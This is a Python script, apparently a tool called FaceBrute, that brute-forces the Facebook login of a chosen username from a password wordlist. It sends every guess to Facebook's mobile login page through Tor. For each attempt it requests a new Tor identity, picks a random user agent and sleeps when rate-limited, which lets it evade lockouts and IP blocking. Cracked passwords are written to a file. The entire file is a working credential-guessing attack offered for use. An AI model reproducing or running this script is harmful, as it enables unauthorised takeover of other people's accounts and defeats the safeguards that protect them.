import requests,re,os,random,lxml,time
from stem import Signal
from stem.control import Controller
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()
os.system('service tor start && clear')
print("\033[1m\033[91m  █████▒▄▄▄       ▄████▄  ▓█████  ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████ \n▓██   ▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ \n▒████ ░▒██  ▀█▄  ▒▓█    ▄ ▒███   ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   \n░▓█▒  ░░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ \n░▒█░    ▓█   ▓██▒▒ ▓███▀ ░░▒████▒░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒\n ▒ ░    ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░\n ░       ▒   ▒▒ ░  ░  ▒    ░ ░  ░▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░\n ░ ░     ░   ▒   ░           ░    ░    ░   ░░   ░  ░░░ ░ ░   ░         ░\n \033[97mCoded by : http://github.com/graysuit\n Meet him : http://fb.com/gray.programmerz.5 \n Wordlist Generator : http://github.com/graysuit/wGen")
email,wlist,IP=input(' \033[92m[+] Enter Username : '),input(' [+] Enter Wordlist name, Default:password.txt : '),input(' [+] Should I display Public IP? Default:y, y/n : ')
print(' [+] Removing duplicate words in '+wlist+'\n [+] Only passwords >= 6 will be used.\n [+] Open '+email+'response.txt to view complete responses by facebook.')
l = 1
if IP == 'n' or IP == 'N':l = ''
if os.path.exists(email+'_response.txt'):os.remove(email+'_response.txt')
if wlist=='':wlist='password.txt'
if not os.path.exists(wlist):quit(' \033[91m[-] '+wlist+' doesn\'t exits\033[97m')
print('\033[97m')
lines_seen=set()
outfile=open('temp.txt','w')
for line in open(wlist,'r'):
	if len(line)>6:
		if line not in lines_seen:outfile.write(line);lines_seen.add(line)
outfile.close()
os.remove(wlist)
open(wlist,'w').write(open('temp.txt','r').read())
os.remove('temp.txt')
with open(wlist,'r') as h:
    g = len(h.readlines())
s = open(wlist,'r')
k=0
proxy,post_url,payload,cookie={"http":"socks5://localhost:9050","https":'socks4://localhost:9050'},'https://m.facebook.com/login.php',{},{}
def function(email,passw):
	headers = {'User-Agent':random.choice(open('user-agents.txt').read().splitlines()),'Accept-Language':'en-US,en;q=0.5'}
	payload['email'] = email
	payload['pass'] = passw
	e = ''
	if l == 1:e = requests.get('https://api.ipify.org',proxies=proxy,verify=False).text
	with Controller.from_port(port = 9051) as c:
		c.authenticate()
		c.signal(Signal.NEWNYM)
		A=requests.post(post_url,data=payload,headers=headers,proxies=proxy,verify=False)				
		soup = BeautifulSoup(re.sub("</"," </", A.text),"lxml")
		for s in soup(["style","script"]):s.decompose()
		clean = re.sub("To personalize content, tailor and measure ads, and provide a safer experience, we use cookies. By tapping on the site, you agree to our use of cookies on and off Facebook. Learn more, including about controls: Cookies Policy . Facebook ","", re.sub(' +',' ',soup.get_text()))
		print('\n ['+str(k)+'/'+str(g)+'] Trying',passw+' '+e+' FB says '+clean[:28])
		open(email+'_response.txt','a').write(clean+' '+passw)
		if 'Facebook ' in clean[:9] or 'Please confirm your identity' in clean or 'Your account has been temporarily locked' in clean:
			open('found.txt','a').write('\nUsername='+email+' Password='+passw)
			quit('\n \033[1;32m[+] Congrats!!! Password is : '+passw+' [+] Saved : found.txt\n\n')
		elif'Please try again later'in clean or 'You Can\'t Do That Right Now' in  clean:
			open(email+'_left_password.txt','a').write(passw+'\n')
			print('\033[93m [+] IP used so much.\n [+] Password Saved in '+email+'_left_password.txt')
			m = input(' [+] Enter minutes to sleep for or nothing for no sleep : ')
			if(m.isdigit()):
				print(' [+] Waiting for '+m+' minutes...\033[97m')
				time.sleep(int(m)*60)
			return False	
		else:
			return False

for i in range(0,g):
	k+=1
	passw=s.readline()
	if function(email,passw):break
